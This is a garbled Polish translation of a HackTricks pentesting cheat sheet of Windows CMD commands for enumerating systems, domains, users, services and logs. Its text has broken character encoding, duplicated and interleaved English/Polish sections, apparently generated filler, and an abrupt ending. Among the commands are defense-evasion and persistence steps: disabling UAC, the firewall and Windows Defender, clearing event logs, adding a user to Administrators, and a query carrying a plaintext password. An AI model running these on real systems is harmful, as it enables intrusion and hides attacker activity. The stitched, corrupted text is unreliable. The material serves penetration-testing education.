# Basic Win CMD for Pentesters

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmujÄ…cej siÄ™ cyberbezpieczeÅ„stwem**? Chcesz zobaczyÄ‡ **reklamÄ™ Twojej firmy w HackTricks**? A moÅ¼e chcesz mieÄ‡ dostÄ™p do **najnowszej wersji PEASS lub pobraÄ‡ HackTricks w formacie PDF**? SprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* **DoÅ‚Ä…cz do** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy Telegram**](https://t.me/peass) lub **Å›ledÅº** mnie na **Twitterze** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR do repozytorium** [**hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informacje o systemie

### Informacje o wersji i Å‚atkach

```bash
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get architecture
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic computersystem LIST full #Get PC info

wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic qfe list brief #Updates

hostname

DRIVERQUERY #3rd party driver vulnerable?
```

### Åšrodowisko

***

### Basic CMD for Pentesters

### Podstawowe polecenia CMD dla pentesterÃ³w

***

#### System Information

#### Informacje o systemie

**System Version**

**Wersja systemu**

```plaintext
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

**System Architecture**

**Architektura systemu**

```plaintext
wmic os get osarchitecture
```

**List Users**

**WyÅ›wietl uÅ¼ytkownikÃ³w**

```plaintext
net user
```

**List Groups**

**WyÅ›wietl grupy**

```plaintext
net localgroup
```

**List Network Interfaces**

**WyÅ›wietl interfejsy sieciowe**

```plaintext
ipconfig /all
```

**List Running Processes**

**WyÅ›wietl uruchomione procesy**

```plaintext
tasklist
```

**List Installed Programs**

**WyÅ›wietl zainstalowane programy**

```plaintext
wmic product get name,version
```

***

#### File System

#### System plikÃ³w

**List Files and Directories**

**WyÅ›wietl pliki i katalogi**

```plaintext
dir
```

**Change Directory**

**ZmieÅ„ katalog**

```plaintext
cd <directory>
```

**Create Directory**

**UtwÃ³rz katalog**

```plaintext
mkdir <directory>
```

**Delete Directory**

**UsuÅ„ katalog**

```plaintext
rmdir <directory>
```

**Copy File**

**Skopiuj plik**

```plaintext
copy <source> <destination>
```

**Move File**

**PrzenieÅ› plik**

```plaintext
move <source> <destination>
```

**Delete File**

**UsuÅ„ plik**

```plaintext
del <file>
```

***

#### Network

#### SieÄ‡

**Ping**

**Ping**

```plaintext
ping <host>
```

**Traceroute**

**Traceroute**

```plaintext
tracert <host>
```

**Netstat**

**Netstat**

```plaintext
netstat -ano
```

**Port Scanning**

**Skanowanie portÃ³w**

```plaintext
nmap -p- <host>
```

***

#### User Accounts

#### Konta uÅ¼ytkownikÃ³w

**Create User Account**

**UtwÃ³rz konto uÅ¼ytkownika**

```plaintext
net user <username> <password> /add
```

**Delete User Account**

**UsuÅ„ konto uÅ¼ytkownika**

```plaintext
net user <username> /delete
```

**Add User to Group**

**Dodaj uÅ¼ytkownika do grupy**

```plaintext
net localgroup <groupname> <username> /add
```

**Remove User from Group**

**UsuÅ„ uÅ¼ytkownika z grupy**

```plaintext
net localgroup <groupname> <username> /delete
```

***

#### Services

#### UsÅ‚ugi

**List Services**

**WyÅ›wietl usÅ‚ugi**

```plaintext
net start
```

**Start Service**

**Uruchom usÅ‚ugÄ™**

```plaintext
net start <servicename>
```

**Stop Service**

**Zatrzymaj usÅ‚ugÄ™**

```plaintext
net stop <servicename>
```

**Disable Service**

**WyÅ‚Ä…cz usÅ‚ugÄ™**

```plaintext
sc config <servicename> start= disabled
```

***

#### Registry

#### Rejestr

**List Registry Keys**

**WyÅ›wietl klucze rejestru**

```plaintext
reg query HKLM\Software
```

**Read Registry Key**

**Odczytaj klucz rejestru**

```plaintext
reg query <key>
```

**Create Registry Key**

**UtwÃ³rz klucz rejestru**

```plaintext
reg add <key>
```

**Delete Registry Key**

**UsuÅ„ klucz rejestru**

```plaintext
reg delete <key>
```

***

#### Task Scheduler

#### Harmonogram zadaÅ„

**List Scheduled Tasks**

**WyÅ›wietl zaplanowane zadania**

```plaintext
schtasks /query /fo LIST /v
```

**Create Scheduled Task**

**UtwÃ³rz zaplanowane zadanie**

```plaintext
schtasks /create /sc <schedule> /tn <taskname> /tr <command>
```

**Delete Scheduled Task**

**UsuÅ„ zaplanowane zadanie**

```plaintext
schtasks /delete /tn <taskname> /f
```

***

#### Event Logs

#### Dzienniki zdarzeÅ„

**List Event Logs**

**WyÅ›wietl dzienniki zdarzeÅ„**

```plaintext
wevtutil el
```

**Read Event Log**

**Odczytaj dziennik zdarzeÅ„**

```plaintext
wevtutil qe <logname>
```

**Clear Event Log**

**WyczyÅ›Ä‡ dziennik zdarzeÅ„**

```plaintext
wevtutil cl <logname>
```

***

#### Firewall

#### Zapora

**List Firewall Rules**

**WyÅ›wietl reguÅ‚y zapory**

```plaintext
netsh advfirewall firewall show rule name=all
```

**Add Firewall Rule**

**Dodaj reguÅ‚Ä™ zapory**

```plaintext
netsh advfirewall firewall add rule name=<rulename> dir=in action=allow protocol=<protocol> localport=<port>
```

**Delete Firewall Rule**

**UsuÅ„ reguÅ‚Ä™ zapory**

```plaintext
netsh advfirewall firewall delete rule name=<rulename>
```

***

#### Miscellaneous

#### RÃ³Å¼ne

**System Information**

**Informacje o systemie**

```plaintext
systeminfo
```

**System Uptime**

**Czas pracy systemu**

```plaintext
systeminfo | find "System Boot Time"
```

**Date and Time**

**Data i czas**

```plaintext
date /t & time /t
```

**Tasklist**

**Tasklist**

```plaintext
tasklist
```

**Taskkill**

**Taskkill**

```plaintext
taskkill /f /im <processname>
```

**Run Command as Administrator**

**Uruchom polecenie jako administrator**

```plaintext
runas /user:<username> "cmd.exe"
```

**Exit Command Prompt**

**Zamknij wiersz polecenia**

```plaintext
exit
```

```bash
set #List all environment variables
```

Niezbedne zmienne Å›rodowiskowe:

* **COMPUTERNAME**: Nazwa komputera
* **TEMP/TMP:** Folder tymczasowy
* **USERNAME:** Twoja nazwa uÅ¼ytkownika
* **HOMEPATH/USERPROFILE:** Katalog domowy
* **windir:** C:\Windows
* **OS**: System operacyjny Windows
* **LOGONSERVER**: Nazwa kontrolera domeny
* **USERDNSDOMAIN**: Nazwa domeny do uÅ¼ycia z DNS
* **USERDOMAIN**: Nazwa domeny

```bash
nslookup %LOGONSERVER%.%USERDNSDOMAIN% #DNS request for DC
```

### Zamontowane dyski

W systemie Windows moÅ¼na zamontowaÄ‡ dodatkowe dyski, ktÃ³re sÄ… dostÄ™pne jako osobne litery dyskÃ³w. MoÅ¼na to zrobiÄ‡ za pomocÄ… polecenia `diskpart` lub za pomocÄ… interfejsu graficznego. PoniÅ¼ej przedstawiono kilka przykÅ‚adÃ³w dotyczÄ…cych zarzÄ…dzania zamontowanymi dyskami.

#### WyÅ›wietlanie zamontowanych dyskÃ³w

Aby wyÅ›wietliÄ‡ listÄ™ zamontowanych dyskÃ³w, moÅ¼na uÅ¼yÄ‡ polecenia `wmic logicaldisk get deviceid, volumename, description`. Spowoduje to wyÅ›wietlenie informacji o wszystkich zamontowanych dyskach, takich jak identyfikator urzÄ…dzenia, nazwa woluminu i opis.

#### Montowanie dysku

Aby zamontowaÄ‡ nowy dysk, moÅ¼na uÅ¼yÄ‡ polecenia `diskpart` w wierszu poleceÅ„. NaleÅ¼y wpisaÄ‡ `diskpart`, a nastÄ™pnie uÅ¼yÄ‡ poleceÅ„ `list disk`, `select disk X` (gdzie X to numer dysku) i `assign letter=Y` (gdzie Y to litera, ktÃ³rÄ… chcemy przypisaÄ‡ do dysku).

#### OdÅ‚Ä…czanie dysku

Aby odÅ‚Ä…czyÄ‡ zamontowany dysk, moÅ¼na uÅ¼yÄ‡ polecenia `diskpart`. NaleÅ¼y wpisaÄ‡ `diskpart`, a nastÄ™pnie uÅ¼yÄ‡ poleceÅ„ `list volume`, `select volume X` (gdzie X to numer woluminu) i `remove letter=Y` (gdzie Y to litera przypisana do dysku).

#### Automatyczne montowanie dysku przy starcie systemu

Aby skonfigurowaÄ‡ automatyczne montowanie dysku przy starcie systemu, moÅ¼na uÅ¼yÄ‡ polecenia `diskpart`. NaleÅ¼y wpisaÄ‡ `diskpart`, a nastÄ™pnie uÅ¼yÄ‡ poleceÅ„ `list volume`, `select volume X` (gdzie X to numer woluminu) i `assign letter=Y` (gdzie Y to litera, ktÃ³rÄ… chcemy przypisaÄ‡ do dysku). NastÄ™pnie naleÅ¼y wpisaÄ‡ `exit`, aby wyjÅ›Ä‡ z `diskpart`.

```bash
(wmic logicaldisk get caption 2>nul | more) || (fsutil fsinfo drives 2>nul)
wmic logicaldisk get caption,description,providername
```

### [Defender](authentication-credentials-uac-and-efs/#defender)

### Kosz

```bash
dir C:\$Recycle.Bin /s /b
```

### Procesy, UsÅ‚ugi i Oprogramowanie

#### Procesy

Aby wyÅ›wietliÄ‡ listÄ™ uruchomionych procesÃ³w, uÅ¼yj polecenia:

```plaintext
tasklist
```

Aby zakoÅ„czyÄ‡ proces, uÅ¼yj polecenia:

```plaintext
taskkill /PID <PID_procesu>
```

#### UsÅ‚ugi

Aby wyÅ›wietliÄ‡ listÄ™ uruchomionych usÅ‚ug, uÅ¼yj polecenia:

```plaintext
net start
```

Aby zatrzymaÄ‡ usÅ‚ugÄ™, uÅ¼yj polecenia:

```plaintext
net stop <nazwa_usÅ‚ugi>
```

#### Oprogramowanie

Aby wyÅ›wietliÄ‡ zainstalowane oprogramowanie, uÅ¼yj polecenia:

```plaintext
wmic product get name,version
```

Aby odinstalowaÄ‡ oprogramowanie, uÅ¼yj polecenia:

```plaintext
wmic product where name="<nazwa_oprogramowania>" call uninstall
```

### Rejestr systemu Windows

Aby wyÅ›wietliÄ‡ zawartoÅ›Ä‡ klucza rejestru, uÅ¼yj polecenia:

```plaintext
reg query "<Å›cieÅ¼ka_do_klucza>"
```

Aby zmieniÄ‡ wartoÅ›Ä‡ klucza rejestru, uÅ¼yj polecenia:

```plaintext
reg add "<Å›cieÅ¼ka_do_klucza>" /v "<nazwa_wartoÅ›ci>" /t REG_SZ /d "<nowa_wartoÅ›Ä‡>" /f
```

Aby usunÄ…Ä‡ klucz rejestru, uÅ¼yj polecenia:

```plaintext
reg delete "<Å›cieÅ¼ka_do_klucza>" /f
```

### Harmonogram zadaÅ„

Aby wyÅ›wietliÄ‡ listÄ™ zaplanowanych zadaÅ„, uÅ¼yj polecenia:

```plaintext
schtasks /query /fo LIST
```

Aby usunÄ…Ä‡ zaplanowane zadanie, uÅ¼yj polecenia:

```plaintext
schtasks /delete /tn "<nazwa_zadania>" /f
```

### UsÅ‚ugi zdalne

Aby sprawdziÄ‡, czy usÅ‚ugi zdalne sÄ… wÅ‚Ä…czone, uÅ¼yj polecenia:

```plaintext
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
```

Aby wÅ‚Ä…czyÄ‡ usÅ‚ugi zdalne, uÅ¼yj polecenia:

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

Aby wyÅ‚Ä…czyÄ‡ usÅ‚ugi zdalne, uÅ¼yj polecenia:

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
```

### Firewall

Aby wyÅ›wietliÄ‡ konfiguracjÄ™ zapory sieciowej, uÅ¼yj polecenia:

```plaintext
netsh advfirewall show allprofiles
```

Aby wÅ‚Ä…czyÄ‡ zapÃ³rÄ™ sieciowÄ…, uÅ¼yj polecenia:

```plaintext
netsh advfirewall set allprofiles state on
```

Aby wyÅ‚Ä…czyÄ‡ zapÃ³rÄ™ sieciowÄ…, uÅ¼yj polecenia:

```plaintext
netsh advfirewall set allprofiles state off
```

### UAC (User Account Control)

Aby sprawdziÄ‡ ustawienia UAC, uÅ¼yj polecenia:

```plaintext
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA
```

Aby wÅ‚Ä…czyÄ‡ UAC, uÅ¼yj polecenia:

```plaintext
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 1 /f
```

Aby wyÅ‚Ä…czyÄ‡ UAC, uÅ¼yj polecenia:

```plaintext
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
```

### Windows Defender

Aby sprawdziÄ‡ stan Windows Defender, uÅ¼yj polecenia:

```plaintext
sc query WinDefend
```

Aby wÅ‚Ä…czyÄ‡ Windows Defender, uÅ¼yj polecenia:

```plaintext
sc start WinDefend
```

Aby wyÅ‚Ä…czyÄ‡ Windows Defender, uÅ¼yj polecenia:

```plaintext
sc stop WinDefend
```

### Windows Update

Aby sprawdziÄ‡ stan Windows Update, uÅ¼yj polecenia:

```plaintext
sc query wuauserv
```

Aby wÅ‚Ä…czyÄ‡ Windows Update, uÅ¼yj polecenia:

```plaintext
sc start wuauserv
```

Aby wyÅ‚Ä…czyÄ‡ Windows Update, uÅ¼yj polecenia:

```plaintext
sc stop wuauserv
```

```bash
schtasks /query /fo LIST /v #Verbose out of scheduled tasks
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
tasklist /V #List processes
tasklist /SVC #links processes to started services
net start #Windows Services started
wmic service list brief #List services
sc query #List of services
dir /a "C:\Program Files" #Installed software
dir /a "C:\Program Files (x86)" #Installed software
reg query HKEY_LOCAL_MACHINE\SOFTWARE #Installed software
```

## Informacje o domenie

### Whois

Whois to protokÃ³Å‚ internetowy sÅ‚uÅ¼Ä…cy do uzyskiwania informacji o domenach. Pozwala na sprawdzenie dostÄ™pnoÅ›ci domeny oraz uzyskanie informacji o jej wÅ‚aÅ›cicielu.

```plaintext
whois <domena>
```

### DNS

DNS (Domain Name System) to system umoÅ¼liwiajÄ…cy przypisywanie adresÃ³w IP do nazw domenowych. Pozwala na tÅ‚umaczenie nazw domenowych na adresy IP i odwrotnie.

```plaintext
nslookup <domena>
```

### Reverse DNS

Reverse DNS to proces tÅ‚umaczenia adresu IP na nazwÄ™ domeny. Pozwala na sprawdzenie, jakie domeny sÄ… powiÄ…zane z danym adresem IP.

```plaintext
nslookup <adres IP>
```

### MX Records

MX Records (Mail Exchange Records) to rekordy DNS, ktÃ³re wskazujÄ…, ktÃ³re serwery pocztowe sÄ… odpowiedzialne za obsÅ‚ugÄ™ poczty dla danej domeny.

```plaintext
nslookup -type=mx <domena>
```

### SPF Records

SPF Records (Sender Policy Framework Records) to rekordy DNS, ktÃ³re okreÅ›lajÄ…, ktÃ³re serwery sÄ… uprawnione do wysyÅ‚ania poczty w imieniu danej domeny. PomagajÄ… w zwalczaniu spamu i faÅ‚szywych wiadomoÅ›ci e-mail.

```plaintext
nslookup -type=txt <domena>
```

### DKIM Records

DKIM Records (DomainKeys Identified Mail Records) to rekordy DNS, ktÃ³re sÅ‚uÅ¼Ä… do weryfikacji autentycznoÅ›ci wiadomoÅ›ci e-mail. PozwalajÄ… na sprawdzenie, czy wiadomoÅ›Ä‡ zostaÅ‚a wysÅ‚ana przez uprawnionego nadawcÄ™.

```plaintext
nslookup -type=txt <domena>._domainkey.<domena>
```

### DMARC Records

DMARC Records (Domain-based Message Authentication, Reporting, and Conformance Records) to rekordy DNS, ktÃ³re okreÅ›lajÄ… politykÄ™ weryfikacji autentycznoÅ›ci wiadomoÅ›ci e-mail. PozwalajÄ… na ochronÄ™ przed faÅ‚szywymi wiadomoÅ›ciami e-mail.

```plaintext
nslookup -type=txt _dmarc.<domena>
```

```bash
# Generic AD info
echo %USERDOMAIN% #Get domain name
echo %USERDNSDOMAIN% #Get domain name
echo %logonserver% #Get name of the domain controller
set logonserver #Get name of the domain controller
set log #Get name of the domain controller
gpresult /V # Get current policy applied
wmic ntdomain list /format:list	#Displays information about the Domain and Domain Controllers

# Users
dsquery user #Get all users
net user /domain #List all users of the domain
net user <ACCOUNT_NAME> /domain #Get information about that user
net accounts /domain #Password and lockout policy
wmic useraccount list /format:list #Displays information about all local accounts and any domain accounts that have logged into the device
wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET ds_samaccountname #Get all users
wmic /NAMESPACE:\\root\directory\ldap PATH ds_user where "ds_samaccountname='user_name'" GET # Get info of 1 users
wmic sysaccount list /format:list #Â Dumps information about any system accounts that are being used as service accounts.

# Groups
net group /domain #List of domain groups
net localgroup administrators /domain #List uses that belongs to the administrators group inside the domain (the group "Domain Admins" is included here)
net group "Domain Admins" /domain #List users with domain admin privileges
net group "domain computers" /domain #List of PCs connected to the domain
net group "Domain Controllers" /domain #List PC accounts of domains controllers
wmic group list /format:list # Information about all local groups
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group GET ds_samaccountname #Get all groups
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" Get ds_member /Value #Members of the group
wmic path win32_groupuser where (groupcomponent="win32_group.name="domain admins",domain="DOMAIN_NAME"") #Members of the group

# Computers
dsquery computer #Get all computers
net view /domain #Lis of PCs of the domain
nltest /dclist:<DOMAIN> #List domain controllers
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname #All computers
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_dnshostname #All computers

# Trust relations
nltest /domain_trusts #Mapping of the trust relationships

# Get all objects inside an OU
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

### Dzienniki i zdarzenia

W systemie Windows istnieje wiele rodzajÃ³w dziennikÃ³w i zdarzeÅ„, ktÃ³re mogÄ… dostarczyÄ‡ cennych informacji podczas testowania penetracyjnego. PoniÅ¼ej przedstawiam kilka przykÅ‚adÃ³w najwaÅ¼niejszych dziennikÃ³w i zdarzeÅ„, ktÃ³re warto monitorowaÄ‡:

#### Dziennik aplikacji (Application Log)

Dziennik aplikacji zawiera informacje o zdarzeniach zwiÄ…zanych z aplikacjami dziaÅ‚ajÄ…cymi na systemie. MoÅ¼e zawieraÄ‡ bÅ‚Ä™dy, ostrzeÅ¼enia, informacje o uruchamianiu i zamykaniu aplikacji.

#### Dziennik zabezpieczeÅ„ (Security Log)

Dziennik zabezpieczeÅ„ zawiera informacje o zdarzeniach zwiÄ…zanych z bezpieczeÅ„stwem systemu. MoÅ¼e zawieraÄ‡ informacje o logowaniu, nieudanych prÃ³bach logowania, zmianach uprawnieÅ„ uÅ¼ytkownikÃ³w, atakach na system itp.

#### Dziennik systemu (System Log)

Dziennik systemu zawiera informacje o zdarzeniach zwiÄ…zanych z dziaÅ‚aniem samego systemu. MoÅ¼e zawieraÄ‡ informacje o bÅ‚Ä™dach systemowych, awariach sprzÄ™tu, zmianach konfiguracji systemu itp.

#### Dziennik usÅ‚ug (Service Log)

Dziennik usÅ‚ug zawiera informacje o zdarzeniach zwiÄ…zanych z dziaÅ‚aniem usÅ‚ug systemowych. MoÅ¼e zawieraÄ‡ informacje o uruchamianiu, zatrzymywaniu, awariach i innych zdarzeniach zwiÄ…zanych z usÅ‚ugami.

#### Dziennik bezpieczeÅ„stwa (Audit Log)

Dziennik bezpieczeÅ„stwa zawiera informacje o zdarzeniach zwiÄ…zanych z audytem systemu. MoÅ¼e zawieraÄ‡ informacje o zmianach w politykach bezpieczeÅ„stwa, prÃ³bach dostÄ™pu do chronionych zasobÃ³w, zmianach w konfiguracji systemu itp.

#### Dziennik aplikacji internetowej (Web Application Log)

Dziennik aplikacji internetowej zawiera informacje o zdarzeniach zwiÄ…zanych z dziaÅ‚aniem aplikacji internetowych. MoÅ¼e zawieraÄ‡ informacje o Å¼Ä…daniach HTTP, bÅ‚Ä™dach aplikacji, prÃ³bach atakÃ³w itp.

#### Dziennik rejestru (Registry Log)

Dziennik rejestru zawiera informacje o zdarzeniach zwiÄ…zanych z modyfikacjÄ… rejestru systemu. MoÅ¼e zawieraÄ‡ informacje o zmianach w kluczach rejestru, dodawaniu, usuwaniu lub modyfikowaniu wartoÅ›ci itp.

#### Dziennik firewalla (Firewall Log)

Dziennik firewalla zawiera informacje o zdarzeniach zwiÄ…zanych z dziaÅ‚aniem firewalla systemowego. MoÅ¼e zawieraÄ‡ informacje o blokowaniu lub zezwalaniu na poÅ‚Ä…czenia sieciowe, atakach na system itp.

#### Dziennik audytu (Audit Log)

Dziennik audytu zawiera informacje o zdarzeniach zwiÄ…zanych z audytem systemu. MoÅ¼e zawieraÄ‡ informacje o zmianach w politykach bezpieczeÅ„stwa, prÃ³bach dostÄ™pu do chronionych zasobÃ³w, zmianach w konfiguracji systemu itp.

#### Dziennik aplikacji internetowej (Web Application Log)

Dziennik aplikacji internetowej zawiera informacje o zdarzeniach zwiÄ…zanych z dziaÅ‚aniem aplikacji internetowych. MoÅ¼e zawieraÄ‡ informacje o Å¼Ä…daniach HTTP, bÅ‚Ä™dach aplikacji, prÃ³bach atakÃ³w itp.

#### Dziennik rejestru (Registry Log)

Dziennik rejestru zawiera informacje o zdarzeniach zwiÄ…zanych z modyfikacjÄ… rejestru systemu. MoÅ¼e zawieraÄ‡ informacje o zmianach w kluczach rejestru, dodawaniu, usuwaniu lub modyfikowaniu wartoÅ›ci itp.

#### Dziennik firewalla (Firewall Log)

Dziennik firewalla zawiera informacje o zdarzeniach zwiÄ…zanych z dziaÅ‚aniem firewalla systemowego. MoÅ¼e zawieraÄ‡ informacje o blokowaniu lub zezwalaniu na poÅ‚Ä…czenia sieciowe, atakach na system itp.

```bash
#Make a security query using another credentials
wevtutil qe security /rd:true /f:text /r:helpline /u:HELPLINE\zachary /p:0987654321
```

#### List all users

```plaintext
net user
```

#### Get detailed information about a specific user

```plaintext
net user <username>
```

#### Create a new user

```plaintext
net user <username> <password> /add
```

#### Delete a user

```plaintext
net user <username> /delete
```

### Groups

#### List all groups

```plaintext
net localgroup
```

#### Get detailed information about a specific group

```plaintext
net localgroup <groupname>
```

#### Create a new group

```plaintext
net localgroup <groupname> /add
```

#### Add a user to a group

```plaintext
net localgroup <groupname> <username> /add
```

#### Remove a user from a group

```plaintext
net localgroup <groupname> <username> /delete
```

## Services

### List all services

```plaintext
sc query
```

### Get detailed information about a specific service

```plaintext
sc query <servicename>
```

### Start a service

```plaintext
sc start <servicename>
```

### Stop a service

```plaintext
sc stop <servicename>
```

### Restart a service

```plaintext
sc stop <servicename> && sc start <servicename>
```

### Change the startup type of a service

```plaintext
sc config <servicename> start= <boot_type>
```

Replace `<boot_type>` with one of the following values:

* `boot` (start at boot)
* `system` (start during system startup)
* `auto` (start automatically)
* `demand` (start on demand)
* `disabled` (do not start)
* `delayed-auto` (start automatically, but delayed)

### Disable a service

```plaintext
sc config <servicename> start= disabled
```

### Enable a service

```plaintext
sc config <servicename> start= demand
```

```bash
#Me
whoami /all #All info about me, take a look at the enabled tokens
whoami /priv #Show only privileges

# Local users
net users #All users
dir /b /ad "C:\Users"
net user %username% #Info about a user (me)
net accounts #Information about password requirements
wmic USERACCOUNT Get Domain,Name,Sid
net user /add [username] [password] #Create user

# Other users looged
qwinsta #Anyone else logged in?

#Lauch new cmd.exe with new creds (to impersonate in network)
runas /netonly /user<DOMAIN>\<NAME> "cmd.exe" ::The password will be prompted

#Check current logon session as administrator using logonsessions from sysinternals
logonsessions.exe
logonsessions64.exe
```

### Grupy

Grupy w systemie Windows sÄ… kolekcjÄ… uÅ¼ytkownikÃ³w, ktÃ³rzy majÄ… wspÃ³lne uprawnienia i dostÄ™p do zasobÃ³w systemowych. Grupy sÄ… uÅ¼ywane do zarzÄ…dzania uprawnieniami i kontroli dostÄ™pu w systemie.

#### WyÅ›wietlanie grup

Aby wyÅ›wietliÄ‡ listÄ™ grup w systemie, moÅ¼esz uÅ¼yÄ‡ polecenia `net localgroup` lub `net group`. Oto przykÅ‚ad:

```plaintext
net localgroup
```

#### Tworzenie grup

Aby utworzyÄ‡ nowÄ… grupÄ™, moÅ¼esz uÅ¼yÄ‡ polecenia `net localgroup` z opcjÄ… `/add`. Na przykÅ‚ad:

```plaintext
net localgroup <nazwa_grupy> /add
```

#### Dodawanie uÅ¼ytkownikÃ³w do grupy

Aby dodaÄ‡ uÅ¼ytkownika do grupy, moÅ¼esz uÅ¼yÄ‡ polecenia `net localgroup` z opcjÄ… `/add`. Na przykÅ‚ad:

```plaintext
net localgroup <nazwa_grupy> <nazwa_uÅ¼ytkownika> /add
```

#### Usuwanie grupy

Aby usunÄ…Ä‡ grupÄ™, moÅ¼esz uÅ¼yÄ‡ polecenia `net localgroup` z opcjÄ… `/delete`. Na przykÅ‚ad:

```plaintext
net localgroup <nazwa_grupy> /delete
```

#### Usuwanie uÅ¼ytkownika z grupy

Aby usunÄ…Ä‡ uÅ¼ytkownika z grupy, moÅ¼esz uÅ¼yÄ‡ polecenia `net localgroup` z opcjÄ… `/delete`. Na przykÅ‚ad:

```plaintext
net localgroup <nazwa_grupy> <nazwa_uÅ¼ytkownika> /delete
```

#### WyÅ›wietlanie czÅ‚onkÃ³w grupy

Aby wyÅ›wietliÄ‡ czÅ‚onkÃ³w danej grupy, moÅ¼esz uÅ¼yÄ‡ polecenia `net localgroup` z opcjÄ… `/domain`. Na przykÅ‚ad:

```plaintext
net localgroup <nazwa_grupy> /domain
```

#### Zmiana nazwy grupy

Aby zmieniÄ‡ nazwÄ™ grupy, moÅ¼esz uÅ¼yÄ‡ polecenia `net localgroup` z opcjÄ… `/rename`. Na przykÅ‚ad:

```plaintext
net localgroup <stara_nazwa_grupy> <nowa_nazwa_grupy> /rename
```

#### Zmiana opisu grupy

Aby zmieniÄ‡ opis grupy, moÅ¼esz uÅ¼yÄ‡ polecenia `net localgroup` z opcjÄ… `/comment`. Na przykÅ‚ad:

```plaintext
net localgroup <nazwa_grupy> /comment:"Nowy opis grupy"
```

#### Zmiana typu grupy

Aby zmieniÄ‡ typ grupy, moÅ¼esz uÅ¼yÄ‡ polecenia `net localgroup` z opcjÄ… `/domain`. Na przykÅ‚ad:

```plaintext
net localgroup <nazwa_grupy> /domain
```

#### Zmiana uprawnieÅ„ grupy

Aby zmieniÄ‡ uprawnienia grupy, moÅ¼esz uÅ¼yÄ‡ polecenia `icacls` z odpowiednimi opcjami. Na przykÅ‚ad:

```plaintext
icacls <Å›cieÅ¼ka_do_zasobu> /grant <nazwa_grupy>:<uprawnienia>
```

```bash
#Local
net localgroup #All available groups
net localgroup Administrators #Info about a group (admins)
net localgroup administrators [username] /add #Add user to administrators

#Domain
net group /domain #Info about domain groups
net group /domain <domain_group_name> #Users that belongs to the group
```

To list active sessions in Windows, you can use the `query session` command. This command will display information about each active session, including the session ID, username, and session state.

```plaintext
C:\> query session
```

This will provide you with a list of all active sessions on the system.

```
qwinsta
klist sessions
```

### Polityka hasÅ‚a

A password policy is a set of rules and requirements that dictate how passwords should be created and managed within a system. It is an important aspect of security as weak passwords can be easily compromised, leading to unauthorized access to sensitive information.

**Minimum Length**: The minimum length of a password should be defined to ensure that it is not too short and easily guessable. A longer password is generally more secure.

**Complexity**: Passwords should be required to contain a combination of uppercase and lowercase letters, numbers, and special characters. This helps to increase the complexity of the password and make it harder to crack.

**Expiration**: Passwords should have an expiration period, after which they must be changed. This helps to ensure that passwords are regularly updated and reduces the risk of unauthorized access.

**History**: Users should be prevented from reusing their previous passwords. This prevents the reuse of compromised passwords and encourages the use of unique passwords.

**Account Lockout**: After a certain number of failed login attempts, an account should be locked to prevent brute-force attacks. This helps to protect against unauthorized access attempts.

**Two-Factor Authentication**: Implementing two-factor authentication adds an extra layer of security by requiring users to provide a second form of verification, such as a code sent to their mobile device, in addition to their password.

By implementing a strong password policy, organizations can significantly enhance the security of their systems and protect sensitive data from unauthorized access.

```
net accounts
```

### PoÅ›wiadczenia

